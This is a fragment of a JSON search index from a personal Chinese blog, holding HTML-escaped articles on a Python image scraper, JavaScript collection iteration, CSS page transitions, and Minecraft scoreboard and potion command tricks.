正在查找图片&quot;)&amp;nbsp;pic_info&amp;nbsp;=&amp;nbsp;obj.find_all(&#39;img&#39;)&amp;nbsp;j&amp;nbsp;=&amp;nbsp;0&amp;nbsp;#配置遍历&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;pic_info:&amp;nbsp;j&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;pic&amp;nbsp;=&amp;nbsp;str(i[&#39;src&#39;])&amp;nbsp;if&amp;nbsp;&quot;http&quot;&amp;nbsp;not&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;if&amp;nbsp;&quot;data&quot;&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;continue&amp;nbsp;else:&amp;nbsp;if&amp;nbsp;&quot;//&quot;&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;print(&quot;http:&quot;+pic)&amp;nbsp;else:&amp;nbsp;if&amp;nbsp;pic[0]&amp;nbsp;==&amp;nbsp;&quot;/&quot;:&amp;nbsp;print(&quot;http://&quot;+link+pic)&amp;nbsp;else:&amp;nbsp;print(&quot;http://&quot;+link+&quot;/&quot;+pic)&amp;nbsp;else:&amp;nbsp;print(pic)&amp;nbsp;下载&amp;nbsp;此文章共含2个附件，分别对应&amp;nbsp;基础版&amp;nbsp;与&amp;nbsp;完整版&amp;nbsp;。&amp;nbsp;imgspider.py&amp;nbsp;-&amp;nbsp;0.73kb&amp;nbsp;预览&amp;nbsp;|&amp;nbsp;下载&amp;nbsp;imgspider-pro.py&amp;nbsp;-&amp;nbsp;1.76kb&amp;nbsp;预览&amp;nbsp;|&amp;nbsp;下载&amp;nbsp;","img":["/articles/20220323/img1.jpg"],"links":["https://github.com/jhao104/proxy_pool","https://raw.githubusercontent.com/RavelloH/download/main/code/imgspider.py","https://ravelloh.github.io/download/code/imgspider.py","https://raw.githubusercontent.com/RavelloH/download/main/code/imgspider-pro.py","https://ravelloh.github.io/download/code/imgspider-pro.py"]},{"name":"JS递归遍历伪数组","url":"/articles/20220206/","time":"2022-02-06","class":["技术"],"tag":["javascript"],"title":["前言","原理","应用","后言"],"context":"&amp;nbsp;前言&amp;nbsp;最近在用getElementsByTagName获取标签内容时，发现与getElementById/ClassName等不同，&amp;nbsp;直接document.getElementsByTagName(&#39;&#39;).id修改页面中所有标签的id时没有反应...&amp;nbsp;console.log输出一下，发现输出的是[li,li,li,li,li]这种形式的伪数组(集合)&amp;nbsp;原理&amp;nbsp;这里既然是以集合的方式输出，就可以用逐项穷举的方式将其中的项挨个执行。&amp;nbsp;首先储存这个集合:*这里以li为例&amp;nbsp;var&amp;nbsp;lis&amp;nbsp;=&amp;nbsp;document.getElementsByTagName(&#39;li&#39;)&amp;nbsp;然后用for循环递归:&amp;nbsp;for(var&amp;nbsp;i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;lis.length;&amp;nbsp;i&amp;nbsp;++){&amp;nbsp;console.log(lis[i])}&amp;nbsp;这里直接输出了，在这个时候就可以用document.等&amp;nbsp;应用&amp;nbsp;给页面内所有span加入加载特效：&amp;nbsp;/*&amp;nbsp;CSS&amp;nbsp;*/&amp;nbsp;span&amp;nbsp;{&amp;nbsp;position:&amp;nbsp;relative;&amp;nbsp;animation-name:&amp;nbsp;startloadingspan;&amp;nbsp;animation-duration:&amp;nbsp;0.8s;&amp;nbsp;}&amp;nbsp;@keyframes&amp;nbsp;startloadingspan&amp;nbsp;{&amp;nbsp;0%&amp;nbsp;{&amp;nbsp;opacity:&amp;nbsp;0;&amp;nbsp;}&amp;nbsp;100%&amp;nbsp;{&amp;nbsp;opacity:&amp;nbsp;1;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;span#active&amp;nbsp;{&amp;nbsp;position:&amp;nbsp;relative;&amp;nbsp;animation-name:&amp;nbsp;endloadingspan;&amp;nbsp;animation-duration:&amp;nbsp;0.8s&amp;nbsp;animation-fill-mode:&amp;nbsp;forwards;&amp;nbsp;}&amp;nbsp;@keyframes&amp;nbsp;endloadingspan&amp;nbsp;{&amp;nbsp;0%&amp;nbsp;{&amp;nbsp;opacity:&amp;nbsp;1;&amp;nbsp;}&amp;nbsp;100%&amp;nbsp;{&amp;nbsp;opacity:&amp;nbsp;0;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//JavaScript&amp;nbsp;window.onbeforeunload&amp;nbsp;=&amp;nbsp;function&amp;nbsp;(e)&amp;nbsp;{&amp;nbsp;document.getElementById(&quot;text&quot;).id&amp;nbsp;=&amp;nbsp;&quot;active&quot;;&amp;nbsp;var&amp;nbsp;spans&amp;nbsp;=&amp;nbsp;document.getElementsByTagName(&#39;span&#39;);&amp;nbsp;for(var&amp;nbsp;i&amp;nbsp;=&amp;nbsp;0;i&amp;nbsp;&lt;&amp;nbsp;spans.length;i&amp;nbsp;++){&amp;nbsp;(spans[i]).id&amp;nbsp;=&amp;nbsp;&quot;active&quot;;}&amp;nbsp;}&amp;nbsp;后言&amp;nbsp;最近忙着升级主题，但是确实没有时间...这坑要慢慢填&amp;nbsp;这是2022的第一篇文章，但估计之后很长一段时间内也不会更多少博客，可能这也是2022的最后一篇文章了吧&amp;nbsp;新年快乐。&amp;nbsp;","img":[],"links":[]},{"name":"Minecraft命令实现在线统计","url":"/articles/20210719/","time":"2021-07-19","class":["游戏"],"tag":["minecraft","json"],"title":["效果","实现方式","命令","ooc"],"context":"&amp;nbsp;注:本文应用于1.13+&amp;nbsp;效果&amp;nbsp;实现方式&amp;nbsp;首先要实现在线时间统计，需要先定义时间。&amp;nbsp;所以在这里&amp;nbsp;需要先创建几个稍后要用到的计分板：&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timetick&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;times&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timem&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timeh&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timed&amp;nbsp;dummy&amp;nbsp;顺次显示的是&amp;nbsp;秒-分-时-天。&amp;nbsp;计时器的思路是这样的：&amp;nbsp;使用循环命令方块为timetick加分，则每秒可以增加20（每秒命令方块运行20次）&amp;nbsp;当timetick为20时，为times加1并设置timetick为0。&amp;nbsp;当times为60时，为timem加1并设置times为0。&amp;nbsp;当timem为60时，为timeh加1并设置timem为0。&amp;nbsp;...以此类推。&amp;nbsp;所以在这里&amp;nbsp;需要使用命令方块组+目标选择器进行运算:&amp;nbsp;循环:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a&amp;nbsp;timetick&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timetick=20..}]&amp;nbsp;times&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timetick=20..}]&amp;nbsp;timetick&amp;nbsp;0&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={times=60..}]&amp;nbsp;timem&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={times=60..}]&amp;nbsp;times&amp;nbsp;0&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timem=60..}]&amp;nbsp;timeh&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timem=60..}]&amp;nbsp;timem&amp;nbsp;0&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timeh=24..}]&amp;nbsp;timed&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timeh=24..}]&amp;nbsp;timeh&amp;nbsp;0&amp;nbsp;最后&amp;nbsp;再加一个title用于显示即可&amp;nbsp;循环：&amp;nbsp;execute&amp;nbsp;as&amp;nbsp;@a&amp;nbsp;at&amp;nbsp;@s&amp;nbsp;run&amp;nbsp;title&amp;nbsp;@p&amp;nbsp;actionbar&amp;nbsp;[{&quot;text&quot;:&quot;在线时间:&quot;,&quot;color&quot;:&quot;green&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;score&quot;:{&quot;objective&quot;:&quot;timed&quot;,&quot;name&quot;:&quot;@p&quot;},&quot;color&quot;:&quot;gray&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;text&quot;:&quot;天&quot;,&quot;color&quot;:&quot;gold&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;score&quot;:{&quot;objective&quot;:&quot;timeh&quot;,&quot;name&quot;:&quot;@p&quot;},&quot;color&quot;:&quot;gray&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;text&quot;:&quot;小时&quot;,&quot;color&quot;:&quot;gold&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;score&quot;:{&quot;objective&quot;:&quot;timem&quot;,&quot;name&quot;:&quot;@p&quot;},&quot;color&quot;:&quot;gray&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;text&quot;:&quot;分&quot;,&quot;color&quot;:&quot;gold&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;score&quot;:{&quot;objective&quot;:&quot;times&quot;,&quot;name&quot;:&quot;@p&quot;},&quot;color&quot;:&quot;gray&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;text&quot;:&quot;秒&quot;,&quot;color&quot;:&quot;gold&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false}]&amp;nbsp;（考虑到多人游戏的情况&amp;nbsp;这里添加了一个execute用于保证显示正确的对象）&amp;nbsp;当我们搭建好全部命令方块并运行后，不难发现虽然计时器正常，但却没有显示值为0的项目:&amp;nbsp;这是因为未被赋值的计分板项目默认不显示，需要手动设置为0：&amp;nbsp;/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;times&amp;nbsp;0&amp;nbsp;/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timem&amp;nbsp;0&amp;nbsp;/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timeh&amp;nbsp;0&amp;nbsp;/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timed&amp;nbsp;0&amp;nbsp;之后即可正常使用。&amp;nbsp;命令&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timetick&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;times&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timem&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timeh&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timed&amp;nbsp;dummy&amp;nbsp;/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;times&amp;nbsp;0&amp;nbsp;/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timem&amp;nbsp;0&amp;nbsp;/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timeh&amp;nbsp;0&amp;nbsp;/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timed&amp;nbsp;0&amp;nbsp;循环:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a&amp;nbsp;timetick&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timetick=20..}]&amp;nbsp;times&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timetick=20..}]&amp;nbsp;timetick&amp;nbsp;0&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={times=60..}]&amp;nbsp;timem&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timem=60..}]&amp;nbsp;timeh&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timem=60..}]&amp;nbsp;timem&amp;nbsp;0&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timeh=24..}]&amp;nbsp;timed&amp;nbsp;1&amp;nbsp;连锁:&amp;nbsp;scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timeh=24..}]&amp;nbsp;timeh&amp;nbsp;0&amp;nbsp;循环:&amp;nbsp;execute&amp;nbsp;as&amp;nbsp;@a&amp;nbsp;at&amp;nbsp;@s&amp;nbsp;run&amp;nbsp;title&amp;nbsp;@p&amp;nbsp;actionbar&amp;nbsp;[{&quot;text&quot;:&quot;在线时间:&quot;,&quot;color&quot;:&quot;green&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;score&quot;:{&quot;objective&quot;:&quot;timed&quot;,&quot;name&quot;:&quot;@p&quot;},&quot;color&quot;:&quot;gray&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;text&quot;:&quot;天&quot;,&quot;color&quot;:&quot;gold&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;score&quot;:{&quot;objective&quot;:&quot;timeh&quot;,&quot;name&quot;:&quot;@p&quot;},&quot;color&quot;:&quot;gray&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;text&quot;:&quot;小时&quot;,&quot;color&quot;:&quot;gold&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;score&quot;:{&quot;objective&quot;:&quot;timem&quot;,&quot;name&quot;:&quot;@p&quot;},&quot;color&quot;:&quot;gray&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;text&quot;:&quot;分&quot;,&quot;color&quot;:&quot;gold&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;score&quot;:{&quot;objective&quot;:&quot;times&quot;,&quot;name&quot;:&quot;@p&quot;},&quot;color&quot;:&quot;gray&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false},{&quot;text&quot;:&quot;秒&quot;,&quot;color&quot;:&quot;gold&quot;,&quot;bold&quot;:false,&quot;italic&quot;:false,&quot;underlined&quot;:false,&quot;strikethrough&quot;:false,&quot;obfuscated&quot;:false}]&amp;nbsp;OOC&amp;nbsp;/summon&amp;nbsp;falling_block&amp;nbsp;~&amp;nbsp;~1.5&amp;nbsp;~&amp;nbsp;{Time:1,BlockState:{Name:&quot;minecraft:redstone_block&quot;},Motion:[0d,-1d,0d],Passengers:[{id:falling_block,Time:1,BlockState:{Name:&quot;minecraft:activator_rail&quot;},Passengers:[{id:command_block_minecart,Command:&quot;/data&amp;nbsp;merge&amp;nbsp;block&amp;nbsp;~&amp;nbsp;~-2&amp;nbsp;~&amp;nbsp;{auto:0b,Command:\\&quot;\\&quot;}&quot;},{id:command_block_minecart,Command:&quot;/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timetick&amp;nbsp;dummy\\n/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;times&amp;nbsp;dummy\\n/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timem&amp;nbsp;dummy\\n/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timeh&amp;nbsp;dummy\\n/scoreboard&amp;nbsp;objectives&amp;nbsp;add&amp;nbsp;timed&amp;nbsp;dummy\\n/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;times&amp;nbsp;0&amp;nbsp;\\n/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timem&amp;nbsp;0&amp;nbsp;\\n/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timeh&amp;nbsp;0&amp;nbsp;\\n/scoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@p&amp;nbsp;timed&amp;nbsp;0&amp;nbsp;\\nscoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a&amp;nbsp;timetick&amp;nbsp;1\\nscoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timetick=20..}]&amp;nbsp;times&amp;nbsp;1&amp;nbsp;\\nscoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timetick=20..}]&amp;nbsp;timetick&amp;nbsp;0&amp;nbsp;\\nscoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={times=60..}]&amp;nbsp;timem&amp;nbsp;1\\nscoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timem=60..}]&amp;nbsp;timeh&amp;nbsp;1&amp;nbsp;\\nscoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timem=60..}]&amp;nbsp;timem&amp;nbsp;0&amp;nbsp;\\nscoreboard&amp;nbsp;players&amp;nbsp;add&amp;nbsp;@a[scores={timeh=24..}]&amp;nbsp;timed&amp;nbsp;1&amp;nbsp;\\nscoreboard&amp;nbsp;players&amp;nbsp;set&amp;nbsp;@a[scores={timeh=24..}]&amp;nbsp;timeh&amp;nbsp;0&amp;nbsp;\\nexecute&amp;nbsp;as&amp;nbsp;@a&amp;nbsp;at&amp;nbsp;@s&amp;nbsp;run&amp;nbsp;title&amp;nbsp;@p&amp;nbsp;actionbar&amp;nbsp;[{\\&quot;text\\&quot;:\\&quot;在线时间:\\&quot;,\\&quot;color\\&quot;:\\&quot;green\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false},{\\&quot;score\\&quot;:{\\&quot;objective\\&quot;:\\&quot;timed\\&quot;,\\&quot;name\\&quot;:\\&quot;@p\\&quot;},\\&quot;color\\&quot;:\\&quot;gray\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false},{\\&quot;text\\&quot;:\\&quot;天\\&quot;,\\&quot;color\\&quot;:\\&quot;gold\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false},{\\&quot;score\\&quot;:{\\&quot;objective\\&quot;:\\&quot;timeh\\&quot;,\\&quot;name\\&quot;:\\&quot;@p\\&quot;},\\&quot;color\\&quot;:\\&quot;gray\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false},{\\&quot;text\\&quot;:\\&quot;小时\\&quot;,\\&quot;color\\&quot;:\\&quot;gold\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false},{\\&quot;score\\&quot;:{\\&quot;objective\\&quot;:\\&quot;timem\\&quot;,\\&quot;name\\&quot;:\\&quot;@p\\&quot;},\\&quot;color\\&quot;:\\&quot;gray\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false},{\\&quot;text\\&quot;:\\&quot;分\\&quot;,\\&quot;color\\&quot;:\\&quot;gold\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false},{\\&quot;score\\&quot;:{\\&quot;objective\\&quot;:\\&quot;times\\&quot;,\\&quot;name\\&quot;:\\&quot;@p\\&quot;},\\&quot;color\\&quot;:\\&quot;gray\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false},{\\&quot;text\\&quot;:\\&quot;秒\\&quot;,\\&quot;color\\&quot;:\\&quot;gold\\&quot;,\\&quot;bold\\&quot;:false,\\&quot;italic\\&quot;:false,\\&quot;underlined\\&quot;:false,\\&quot;strikethrough\\&quot;:false,\\&quot;obfuscated\\&quot;:false}]&quot;},{id:command_block_minecart,Command:&quot;setblock&amp;nbsp;~&amp;nbsp;~1&amp;nbsp;~&amp;nbsp;command_block{auto:1b,Command:\\&quot;fill&amp;nbsp;~&amp;nbsp;~&amp;nbsp;~&amp;nbsp;~&amp;nbsp;~-2&amp;nbsp;~&amp;nbsp;air\\&quot;}&amp;nbsp;replace&quot;},{id:command_block_minecart,Command:&quot;kill&amp;nbsp;@e[type=command_block_minecart,distance=..1]&quot;}]}]}&amp;nbsp;","img":["/articles/20210719/img2.gif","/articles/20210719/img1.png"],"links":[]},{"name":"CSS+JS实现页面切换过渡","url":"/articles/20210705/","time":"2021-07-05","class":["技术","设计"],"tag":["html","javascript","css"],"title":["前言","效果","实现方式","代码","文字版"],"context":"&amp;nbsp;注:&amp;nbsp;此文章中涉及的部分博客功能已在RThemeV3中作出调整，可能已无参考价值&amp;nbsp;前言&amp;nbsp;因为自己最近在忙这个博客的建设，所以自己就想给这个blog做一个切换页面时的过渡。可在网上却都没什么符合这blog主题的，于是自己动手丰衣足食，自己就做了现在的这种效果。&amp;nbsp;效果&amp;nbsp;效果如此blog中的切换效果，即：&amp;nbsp;进入新页面时，除顶栏及底栏外的其余文字部分从屏幕左侧飞入，&amp;nbsp;离开此页面时，除顶栏及底栏外的其余文字部分从屏幕左侧飞出。&amp;nbsp;实现方式&amp;nbsp;考虑到需要有对进入\\离开页面的检测，这里需要用到JavaScript。对样式的调整，我选择了使用CSS动画。&amp;nbsp;这样还有个优点：因为需要让动画结束后元素停留在结束位置，所以先使用动画，将元素从left:-xxxpx移动到left:0px即可。&amp;nbsp;而对于离开页面，则需要使用window.onbeforeunload参数检测是否离开页面，然后触发动画。&amp;nbsp;触发动画的方式，这里采用的是通过JS改变HTML内容的属性id，配合CSS选择器实现。&amp;nbsp;值得注意的是，因为网络原因可能会导致一个页面的加载时间变长，这时若离开页面的动画播放完毕则会重新回到原位置。&amp;nbsp;要解决这个问题，最好的办法是在css动画属性中加入&quot;animation-fill-mode:&amp;nbsp;forwards;&quot;,让动画结束时元素停在结束位置&amp;nbsp;代码&amp;nbsp;-&amp;nbsp;-&amp;nbsp;-&amp;nbsp;CSS：&amp;nbsp;Javascript:&amp;nbsp;HTML&amp;nbsp;文字版&amp;nbsp;CSS：&amp;nbsp;.text&amp;nbsp;{&amp;nbsp;position:&amp;nbsp;relative;&amp;nbsp;animation-name:&amp;nbsp;startloading;&amp;nbsp;animation-duration:&amp;nbsp;1s;&amp;nbsp;}&amp;nbsp;@keyframes&amp;nbsp;startloading&amp;nbsp;{&amp;nbsp;0%&amp;nbsp;{&amp;nbsp;left:&amp;nbsp;-2000px&amp;nbsp;}&amp;nbsp;100%&amp;nbsp;{&amp;nbsp;left:&amp;nbsp;0px;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;.text#active&amp;nbsp;{&amp;nbsp;position:&amp;nbsp;relative;&amp;nbsp;animation-name:&amp;nbsp;endloading;&amp;nbsp;animation-duration:&amp;nbsp;1s;&amp;nbsp;color:&amp;nbsp;#111111;&amp;nbsp;animation-fill-mode:&amp;nbsp;forwards;&amp;nbsp;}&amp;nbsp;@keyframes&amp;nbsp;endloading&amp;nbsp;{&amp;nbsp;0%&amp;nbsp;{&amp;nbsp;left:&amp;nbsp;0px&amp;nbsp;}&amp;nbsp;100%&amp;nbsp;{&amp;nbsp;left:&amp;nbsp;-2000px;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;JS：&amp;nbsp;window.onbeforeunload&amp;nbsp;=&amp;nbsp;function&amp;nbsp;(e)&amp;nbsp;{&amp;nbsp;document.getElementById(&quot;text&quot;).id&amp;nbsp;=&amp;nbsp;&quot;active&quot;;&amp;nbsp;}&amp;nbsp;HTML：&amp;nbsp;&lt;div&amp;nbsp;class=&quot;text&amp;nbsp;title&quot;&amp;nbsp;id=&quot;text&quot;&gt;&amp;nbsp;文字内容&amp;nbsp;&lt;/div&gt;&amp;nbsp;","img":["/articles/20210705/code1.png","/articles/20210705/code2.png","/articles/20210705/code3.png"],"links":[]},{"name":"新主题上线","url":"/articles/20210701/","time":"2021-07-01","class":["杂谈","设计"],"tag":["建设"],"title":[],"context":"&amp;nbsp;最近做好了这个新主题并应用到博客，&amp;nbsp;因为之前的那个主题是基于Hexo的，自己现在也不太想用，干脆自己做了个&amp;nbsp;这个主题虽说比较简陋，但毕竟是自己做出来的，各方面都很了解，比之前那个四零八乱的好多了。&amp;nbsp;这个主题连同blog放在github了&gt;&gt;Github&amp;nbsp;","img":[],"links":["http://github.com/ravelloh/ravelloh.github.io"]},{"name":"Minecraft反转药水效果","url":"/articles/20200816/","time":"2020-08-16","class":["游戏"],"tag":["minecraft","json"],"title":["原理","效果","命令"],"context":"&amp;nbsp;原理&amp;nbsp;由于一些神奇的BUG特性，高等级效果将会使原效果被反转，而这就使得了一些原版不存在的操作变成了可能。例如，创造模式的玩家不免疫增益效果，只免疫负面效果，而这就使得了如果可以给予创造玩家一种增益效果但实际是负面效果，也是能对创造模式玩家造成伤害的。&amp;nbsp;除此以外，对跳跃提升药水运用相同的原理也有奇效:玩家将会无法跳跃&amp;nbsp;效果&amp;nbsp;另外，这个药水所带来的伤害也高的离谱：&amp;nbsp;也是因为未知原因，死亡后不掉落掉落物*开启死亡掉落的情况下&amp;nbsp;命令&amp;nbsp;/*&amp;nbsp;1.13+&amp;nbsp;*/&amp;nbsp;/give&amp;nbsp;@p&amp;nbsp;minecraft:splash_potion{CustomPotionEffects:[{Id:6b,Duration:12000,Amplifier:125b,Ambient:0b,ShowParticles:0b}]}&amp;nbsp;1&amp;nbsp;/*&amp;nbsp;1.11-1.12&amp;nbsp;*/&amp;nbsp;/give&amp;nbsp;@p&amp;nbsp;minecraft:splash_potion&amp;nbsp;1&amp;nbsp;0&amp;nbsp;{CustomPotionEffects:[{Id:6b,Duration:12000,Amplifier:125b,Ambient:0b,ShowParticles:0b}]}&amp;nbsp;","img":["/articles/20200816/show1.gif","/articles/20200816/show2.gif","/articles/20200816/show3.gif"],"links":[]}]